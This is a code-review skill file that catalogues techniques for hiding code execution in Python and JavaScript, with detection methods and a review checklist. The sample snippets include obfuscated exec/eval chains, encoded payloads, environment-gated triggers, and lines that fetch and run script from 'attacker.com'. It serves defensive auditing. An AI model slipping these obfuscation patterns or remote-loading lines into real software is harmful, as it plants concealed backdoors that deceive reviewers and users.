---
name: malicious-code-patterns
description: Systematic detection of obfuscated code execution, hidden backdoors, and malicious patterns in Python and JavaScript/TypeScript. Use when reviewing code for backdoors, auditing new dependencies, scanning PRs for obfuscated exec/eval/compile patterns, detecting dynamic code generation disguises (builtins aliasing, importlib abuse, getattr chains, compile+FunctionType, base64+eval), homoglyph identifiers, environment-gated payloads, dead-code-that-isn't-dead, and intentional syntax errors used as evasion. Covers all known exec/eval obfuscation families and their detection methods including AST-level analysis.
---

# Malicious Code Patterns

## Purpose

This skill catalogs every known technique for hiding code execution in Python and JavaScript, with detection methods for each. It exists because:

1. Regex-based detection is trivially bypassed
2. LLM review can miss patterns it hasn't been primed on
3. Sophisticated backdoors combine multiple techniques
4. New obfuscation evolves faster than static analysis tools

**Use this as a review checklist when scanning any code for malicious behavior.**

## Python Execution Obfuscation Families

### Family 1: Direct Execution (easy to detect)
```python
exec("payload")
eval("expression")
```
**Detection**: String match on `exec(`, `eval(`
**Bypass difficulty**: Trivial to bypass

### Family 2: Homoglyph Substitution
```python
# Cyrillic 'е', 'х', 'е', 'с' look identical to Latin
ℯ𝓍ℯ𝒸("payload")

# Or Cyrillic identifiers
class UnicodeSаnitizer:  # 'а' is U+0430 Cyrillic, not U+0061 Latin
```
**Detection**: Compare each identifier character's Unicode script property against expected script. Any non-ASCII in Python identifiers in security code = flag. Use `unicodedata.category()` and `unicodedata.name()`.
**Key check**: `all(ord(c) < 128 for c in identifier)` — if False, inspect character by character.

### Family 3: Builtins Module Aliasing
```python
import builtins
b = builtins
b.exec("payload")

# Or deeper alias
import builtins as _b
_x = getattr(_b, 'ex' + 'ec')
_x("payload")
```
**Detection**: Track variable assignments from `builtins` module. Flag any `getattr()` call that resolves to `exec`/`eval`/`compile`.

### Family 4: Dynamic Import + Attribute Access
```python
# __import__ variant
__import__("builtins").exec("payload")

# String concatenation to hide module/function names
__import__("built" + "ins").exec("payload")

# getattr chain with reversed strings
getattr(__import__("built"+"ins"), "".join(reversed(["ec","ex"])))("payload")

# importlib variant
import importlib
importlib.import_module("builtins").exec("payload")
```
**Detection**: Flag all `__import__()` calls and `importlib.import_module()` calls. Track what they return and how the return value is used. String concatenation feeding into import = HIGH suspicion.

### Family 5: sys.modules / globals() / locals() Namespace Access
```python
import sys
sys.modules["builtins"].exec("payload")

globals()["__builtins__"].exec("payload")

# Obfuscated
getattr(globals()["__bu" + "ilt" + "ins__"], "".join(reversed(["al","ev"])))("payload")
```
**Detection**: Flag `sys.modules[`, `globals()[`, `locals()[`, `vars()[` followed by string indexing with concatenation.

### Family 6: compile() + FunctionType (bypass exec detection)
```python
import types
code = compile("payload", "<string>", "exec")
func = types.FunctionType(code.co_consts[0], globals())
func()
```
**Detection**: Flag `types.FunctionType(` combined with `compile(`. Flag `code.co_consts` access. This is NEVER legitimate in application code.

### Family 7: importlib.util Module Creation
```python
import importlib.util
spec = importlib.util.spec_from_loader("plugin", loader=None)
module = importlib.util.module_from_spec(spec)
exec(code, module.__dict__)
```
**Detection**: `importlib.util.spec_from_loader` + `module_from_spec` + any `exec()/compile()` = flag. Real plugin loading uses actual loaders, not None.

### Family 8: Payload Encoding
```python
# Base64
import base64
exec(base64.b64decode("cGF5bG9hZA=="))

# Hex
exec(bytes.fromhex("7061796c6f6164").decode())

# ROT13
import codecs
exec(codecs.decode("cnlybnq", "rot_13"))

# Zlib compression
import zlib
exec(zlib.decompress(b'x\x9c+H\xac\xcc\xc9OL\x01\x00\x08\x97\x02\x83'))

# Marshal (bytecode serialization)
import marshal
exec(marshal.loads(b'...'))

# XOR with key
key = 42
payload = bytes([b ^ key for b in encoded_bytes])
exec(payload.decode())
```
**Detection**: Any encoding/decoding function (`b64decode`, `fromhex`, `rot_13`, `decompress`, `marshal.loads`) whose result flows into `exec`/`eval`/`compile`. Base64 strings with length multiple of 4 near execution = HIGH.

### Family 9: Horizontal Scrolling Hide
```python
legitimate_code = "normal"                                                                                                                                                                                                    ;exec("hidden payload way off screen")
```
**Detection**: Flag lines exceeding 200 characters. Flag semicolons after significant whitespace. Check for statements hidden at the end of long lines.

### Family 10: Decorator / Metaclass Abuse
```python
import functools

def backdoor(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        exec("payload")  # Hidden in decorator
        return func(*args, **kwargs)
    return wrapper

@backdoor
def legitimate_function():
    pass
```
**Detection**: Inspect all decorator definitions for execution calls. Flag decorators that do more than logging/timing/caching.

## JavaScript/TypeScript Execution Obfuscation

### JS Family 1: Direct
```javascript
eval("payload")
new Function("payload")()
setTimeout("payload", 0)  // String argument = eval
setInterval("payload", 0)
```

### JS Family 2: Indirect eval
```javascript
const e = eval
e("payload")

window["ev" + "al"]("payload")
globalThis["eval"]("payload")

// Template literal
eval`payload`

// Comma operator
(0, eval)("payload")
```

### JS Family 3: Dynamic import
```javascript
import("data:text/javascript," + payload)
import("https://attacker.com/payload.js")

// Dynamic require
require(userInput)
const mod = module.constructor._load(path)
```

### JS Family 4: Prototype Pollution → Execution
```javascript
Object.prototype.constructor.constructor("return this")().eval("payload")
// or
"".constructor.constructor("payload")()
```

### JS Family 5: Web API Abuse (browser)
```javascript
// Blob + Worker
new Worker(URL.createObjectURL(new Blob(["payload"])))

// Script injection
document.createElement("script").src = "https://attacker.com/payload.js"

// Fetch + eval
fetch("https://attacker.com/payload.js").then(r => r.text()).then(eval)
```

## Environment-Gated Execution Patterns

### The Pattern
Malicious code that only fires in specific environments to avoid detection in dev/CI/testing:

```python
# Production-only
if os.getenv('DEPLOY_ENV') == 'production':
    malicious_code()

# CI evasion
if not os.getenv('CI') and not os.getenv('GITHUB_ACTIONS'):
    malicious_code()

# Time-based
import datetime
if datetime.datetime.now().weekday() == 6:  # Sunday only
    malicious_code()

# Network-based (only on specific IPs/domains)
import socket
if socket.gethostname() == 'prod-server-01':
    malicious_code()

# Filesystem-based (only if certain files exist)
if os.path.exists('/etc/production.flag'):
    malicious_code()
```

### Detection Checklist
- [ ] Any `os.getenv()` / `process.env` check that gates code execution
- [ ] Environment checks that specifically exclude CI/test environments
- [ ] Time-based conditionals near code execution
- [ ] Hostname/IP checks gating behavior
- [ ] Filesystem existence checks gating behavior
- [ ] **Ask**: "Why does this code behave differently in production vs. development?"

## Multi-File Payload Scattering

### The Pattern
Split the malicious payload across multiple files so no single file review reveals the attack:

```
File A: extracts fragment 1 from hidden source
File B: extracts fragment 2 from different hidden source  
File C: receives fragments, assembles, and executes
```

### Detection
- [ ] **Cross-file data flow**: Does any function receive data from another module that it then passes to an execution function?
- [ ] **Fragment variables**: Variables named `hidden_part1`, `fragment`, `payload_segment` or similar
- [ ] **Assembly functions**: Functions that concatenate inputs from multiple sources before compilation/execution
- [ ] **Static methods called from unrelated modules**: Why is a cache loader being called from a sanitizer?
- [ ] **Review the PR as a whole, not file by file**: The attack depends on compartmentalized review

## Intentional Syntax Anomalies

### Broken `__main__` Guard
```python
if name == "__main__":  # Missing double underscores — never executes
    test_code()          # Looks like a test block but is inert
```
**Why malicious**: Creates the appearance of a test path without actually providing one. Normalizes the presence of code that never runs, making it less likely a reviewer asks "did you test this?"

### Ghost Imports
```python
import types  # Unused? No — used in the execution chain 3 files away
import importlib.util  # "For future compatibility" — actually for module creation
```
**Detection**: Flag imports of execution-adjacent modules (`types`, `importlib`, `marshal`, `ctypes`, `subprocess`, `os`) that aren't obviously used in the same file. Cross-reference with other files in the PR.

## Deceptive Naming Patterns

### Security Theater Names
Code that names itself as security infrastructure while doing the opposite:
- `SecureValidator` that runs `exec()`
- `SafeLoader` that downloads and runs remote code
- `sanitize()` that extracts and executes hidden payloads
- "Legacy compatibility layer" that enables backdoor execution paths
- "Plugin loader" that creates modules from arbitrary strings

### Detection Heuristic
For ANY function/class whose name contains: `secure`, `safe`, `sanitize`, `validate`, `clean`, `filter`, `protect`, `guard`:
- Does it actually do what the name says?
- Does it do ANYTHING ELSE beyond what the name says?
- Does it have side effects unrelated to its stated purpose?

## Master Review Checklist

When reviewing ANY code (not just suspicious code), systematically check:

### Phase 1: Automated Scan (30 seconds)
- [ ] `grep -rn 'exec\|eval\|compile\|FunctionType\|new Function\|__import__\|importlib' .`
- [ ] `grep -rn 'getattr.*builtins\|globals()\|sys\.modules\|marshal\.loads' .`
- [ ] `grep -rn 'base64\|b64decode\|fromhex\|rot_13\|zlib\.decompress' .`
- [ ] `grep -rn "os\.getenv\|process\.env.*production\|DEPLOY_ENV\|NODE_ENV" .`
- [ ] Unicode scanner: `python3 scan_unicode.py . --strict`
- [ ] Long lines: `awk 'length > 200' *.py *.js *.ts`

### Phase 2: Semantic Review (2 minutes per file)
- [ ] Does each function do ONLY what its name says?
- [ ] Are there side effects in pure functions (sanitizers, validators, formatters)?
- [ ] Do any environment checks gate execution paths?
- [ ] Are there imports that seem unrelated to the file's purpose?
- [ ] Do any variables receive data from external files/modules and pass it to execution?

### Phase 3: Cross-File Analysis (for multi-file PRs)
- [ ] Map the data flow across all files in the PR
- [ ] Does any data originate in file A and end up in an execution call in file C?
- [ ] Are there static/class methods called from unexpected modules?
- [ ] Does the PR description accurately describe ALL behavioral changes?

## References

For Python-specific obfuscation techniques and AST-level detection, see `references/python-obfuscation-catalog.md`.
For JavaScript/TypeScript patterns, see `references/javascript-obfuscation-catalog.md`.
